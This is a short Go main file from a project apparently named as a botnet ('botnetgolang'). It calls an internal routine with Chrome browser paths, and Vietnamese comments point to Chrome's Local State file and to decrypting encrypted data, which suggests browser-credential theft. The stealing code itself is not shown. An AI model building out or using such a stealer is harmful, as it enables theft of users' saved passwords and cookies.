package main

import (
	"botnetgolang/internal"
	"botnetgolang/internal/model"
)

func main() {
	// Đường dẫn tới file Local State của Chrome
	internal.MainBL(model.GetChromePaths())

}

// Hàm giải mã dữ liệu được mã hóa
